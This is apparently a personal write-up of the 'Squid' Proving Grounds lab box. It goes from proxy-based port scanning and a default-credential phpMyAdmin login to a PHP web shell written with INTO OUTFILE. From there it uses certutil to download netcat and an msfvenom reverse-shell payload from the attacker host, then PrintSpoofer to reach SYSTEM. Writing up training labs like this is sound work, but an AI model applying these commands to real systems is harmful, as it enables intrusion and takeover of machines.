---
Alias: Squid
Date: 8/31/2022
Platform: Windows
Difficulty: Intermediate
Tags: #InternalPortScannerForSquidProxy #PHPinfoWebServerRootDirectory #DocumentRoot #SQLInectionWebShell #SeImpersonatePrivilegePrivilegeEscalation #InternalPortScannerForSquidProxy
Status: Finished
IP: 192.168.122.189
---

# {{Squid}}


# Resolution summary
- Navigated to web page on port 3128
- Found an internal port scanning tool for Squid proxy
- Ran the port scanner and found ports 8080 and 3306 to be opened
- Setup and ran a squid proxy utilizing foxyproxy
- Navigate to webpage on port 8080 and found phpinfo page showing the root directory of the web server
- Found a link to a Mysql phpMyAdmin login page
- Logged in utulizing the default credentials
- 
- 
- Text

## Improved skills
- skill 1
- skill 2

## Used tools
- nmap

---

# Information Gathering
Scanned all TCP ports:
```bash
#Nmap 7.92 scan initiated Thu Aug 25 17:18:06 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -oN /home/brian/Downloads/Proving_Grounds/Squid/results/192.168.122.189/scans/_quick_tcp_nmap.txt -oX /home/brian/Downloads/Proving_Grounds/Squid/results/192.168.122.189/scans/xml/_quick_tcp_nmap.xml 192.168.122.189
Nmap scan report for 192.168.122.189
Host is up, received user-set (0.16s latency).
Scanned at 2022-08-25 17:18:07 PDT for 80s
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE    REASON  VERSION
3128/tcp open  http-proxy syn-ack Squid http proxy 4.14
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.14

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
#Nmap done at Thu Aug 25 17:19:27 2022 -- 1 IP address (1 host up) scanned in 80.17 seconds
```

Enumerated open TCP ports:
```bash
3128
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
# Port 3128 - Squid http proxy 4.14

#### - Navigated to "http://192.168.231.189:3128" and found the following webpage:

![](Pasted%20image%2020221026235704.png)

#### - Googled "port 3128 enumeration" and found the following Hacktricks webpage:

![](Pasted%20image%2020221026235844.png)

#### - Attempted the following steps but I was unsuccessful:

![](Pasted%20image%2020221027001124.png)

#### - Googled "internal port scanner for Squid github" and found the following tool:

![](Pasted%20image%2020221027001302.png)
#InternalPortScannerForSquidProxy

#### - Git cloned the found "spose" tool to my kali machine

#### - Typed "python spose.py -h" and found the following usage:

![](Pasted%20image%2020221027001834.png)

#### - Typed "python spose.py --proxy http://192.168.231.189:3128 --target 192.168.231.189" and found  open ports 3306 and 8080:

![](Pasted%20image%2020221027001951.png)

#### - Navigated to my foxyproxy on my firefox browser in my kali machine and input the following:

![](Pasted%20image%2020221027002106.png)
#proxy

#### - Turned the "Squid" proxy on and navigated to "http://192.168.231.189:8080" and found the following webpage showing it was running Wampserver version 3.2.3:

![](Pasted%20image%2020221027002401.png)

#### - Navigated to the bottom of the webpage where I found the link "phpinfo" and which redirected me to the phpinfo page:

![](Pasted%20image%2020221027002453.png)

#### - Searched for and noted the root directory of the web server "C:/wamp/www":

![](Pasted%20image%2020221027002652.png)
#PHPinfoWebServerRootDirectory #DocumentRoot

#### - Navigated back to the wampserver webpage where I found and clicked into link phpmyadmin and was forwarded to the phpmyadmin login page to login to mysql:

![](Pasted%20image%2020221027004707.png)

![](Pasted%20image%2020221027005042.png)

#### - Googled "phpmyadmin mysql default credentials" and found the following webpage showing username root and password is left blank:

![](Pasted%20image%2020221027005200.png)
---

# Exploitation
## Name of the technique
## SQL Inection Web Shell

#### - Entered credentials username root and password left as blank and logged in:

![](Pasted%20image%2020221027005654.png)

 #### - Googled "phpmyadmin mysql root login exploit" and found the following webpage showing to click the SQL  link. I then typed SELECT "<?php system($_GET['cmd']); ?>"  INTO OUTFILE 'C:/wamp/www/cmd.php' and go
![](Pasted%20image%2020221027143942.png)

![](Pasted%20image%2020221027144117.png)
 #RootDefaultPasswordSqlInjectionWebshell

#### -Navigated to "http://192.168.231.189:8080/cmd.php/cmd?=dir C:\Windows\system32" Then typed ctrl+f and nc.exe to confirm if netcat was downloaded on the machine and found it was not:

![](Pasted%20image%2020221027144303.png)

#### -Typed "http://192.168.231.189:8080/cmd.php/cmd?=systeminfo" to conirm the system architecture and confirm it was a x64 bit windows machine:

![](Pasted%20image%2020221027144431.png)

#### -Typed "updog -p 80" on my kali machine in the directory which had the nc64.exe file to host it

#### -Typed "certutil.exe -urlcache -split -f "http://[Kali IP]/nc64.exe" nc64.exe" to download netcat on the target machine

#### -Typed "msfvenom -p windows/shell_reverse_tcp LHOST=[Kali IP] LPORT=8080 -f exe > reverse.exe" on Kali machine to create a reverse shell payload

#### -Typed "certutil.exe -urlcache -split -f "http://[Kali IP]/reverse.exe" reverse.exe" on firefox url bar to download the reverse shell payload onto the target machine

#### -Typed "nc -lvnp -p 8080" on Kali machine to listen for the reverse shell 

#### -Typed "reverse.exe" on the firefox url bar to run the reverse shell payload and received a reverse shell as nt authority\local service:

![](Pasted%20image%2020221027144555.png)


---

# Privilege Escalation
## Local Enumeration

#### -Find we are running as nt authority/local system but some privileges assigned to this account are missing:

![](Pasted%20image%2020221027145646.png)

![](Pasted%20image%2020221027145713.png)
#LocalSystemMissingAccountPrivileges

#### -Googled "local service restricted permissions github" and found the following tool to add the missing privileges back:

![](Pasted%20image%2020221027145938.png)
![](Pasted%20image%2020221027150012.png)


## Privilege Escalation vector

#### -Downloaded the .exe version of the tool onto the target machine

#### -Type "FullPowers.exe" to run the tool and now have the missing privileges back and are all enabled:

![](Pasted%20image%2020221027150126.png)

![](Pasted%20image%2020221027150159.png)

#### - As we have SeImpersonatePrivilege enabled I proceeded to downoload PrintSpoofer64.exe on target machine

#SeImpersonatePrivilegePrivilegeEscalation

#### -Typed "PrintSpoofer64.exe -i -c cmd" and received a cmd session as nt authority/system:

![](Pasted%20image%2020221027150259.png)

---
